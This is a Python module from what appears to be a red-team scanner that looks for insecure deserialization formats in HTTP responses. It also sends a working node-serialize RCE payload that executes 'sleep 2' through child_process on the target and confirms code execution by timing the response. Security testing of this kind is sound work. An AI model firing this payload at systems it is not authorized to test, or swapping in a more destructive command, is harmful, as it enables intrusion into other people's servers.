import requests
import re
import base64
import json
import concurrent.futures

class DeserializationExpert:
    """
    Expert Auditor for Insecure Deserialization.
    Covers: Java (Serialized, RMI), Node.js, PHP, .NET, and YAML.
    """
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "RedOps3-DeserializationExpert/1.0"})
        
        # Signatures for serialised formats
        self.signatures = {
            "java_hex": r"\xac\xed\x00\x05",
            "java_b64": r"rO0AB",
            "java_gzip_b64": r"H4sI",
            "php_serialize": r"[OaCs]:\d+:\".*?\"",
            "ruby_marshal": r"\x04\x08[\{\[\:]",
            "python_pickle": r"\x80\x03|\x80\x04",
            "dotnet_viewstate": r"__VIEWSTATE",
            "node_serialize": r"\{\"_$$ND_FUNC$$_\""
        }

    def scan_endpoint(self, url, logger=None):
        findings = []
        try:
            # Short timeout, we just want to look at headers and a bit of body
            resp = self.session.get(url, timeout=5, verify=False)
            
            # 1. Audit Headers and Cookies
            search_space = str(resp.headers) + str(resp.cookies.get_dict())
            for fmt, sig in self.signatures.items():
                if re.search(sig, search_space):
                    findings.append(self._make_finding(url, fmt, "Header/Cookie"))

            # 2. Audit Response Body
            for fmt, sig in self.signatures.items():
                if re.search(sig, resp.text[:10000]):
                    findings.append(self._make_finding(url, fmt, "Response Body"))
            
            # 3. Aggressive: Probe for Node.js Deserialization (if suspected)
            if "node" in str(resp.headers).lower() or "express" in resp.text.lower():
                 findings.extend(self._probe_node_deserialization(url, logger))

        except Exception as e:
            if logger: logger(f"Deserialization Expert Error: {e}", "DEBUG")
        
        return findings

    def _make_finding(self, url, fmt, location):
        severity = "critical" if fmt in ["java_b64", "node_serialize", "python_pickle"] else "high"
        return {
            "title": f"Insecure Deserialization Detected ({fmt.upper()})",
            "description": f"Potentially dangerous serialization format '{fmt}' found in {location}.\nURL: {url}\nThis often leads to Remote Code Execution (RCE) via gadget chains.",
            "severity": severity,
            "tool_source": "deserialization_expert",
            "url": url,
            "raw_loot": f"Signature match: {fmt}"
        }

    def _probe_node_deserialization(self, url, logger):
        # Testing for node-serialize RCE vector
        found = []
        try:
            # Payload that causes a delay if deserialized via node-serialize
            # _$$ND_FUNC$$_function (){ require('child_process').execSync('sleep 2') }()
            payload = '{"rce":"_$$ND_FUNC$$_function (){ require(\'child_process\').execSync(\'sleep 2\') }()"}'
            
            start = requests.compat.time.time()
            # We try sending it in a common cookie name or as JSON body
            self.session.post(url, json=json.loads(payload), timeout=10)
            duration = requests.compat.time.time() - start
            
            if duration >= 2:
                found.append({
                    "title": "Confirmed Node.js Deserialization RCE",
                    "description": f"Verified RCE on {url} via node-serialize gadget. The server was delayed by 2 seconds via sleep command.",
                    "severity": "critical",
                    "tool_source": "deserialization_expert",
                    "url": url,
                    "repro_payload": payload
                })
                if logger: logger(f"CRITICAL: Node.js Deserialization RCE confirmed at {url}", "CRITICAL")
        except Exception:
            pass
        return found
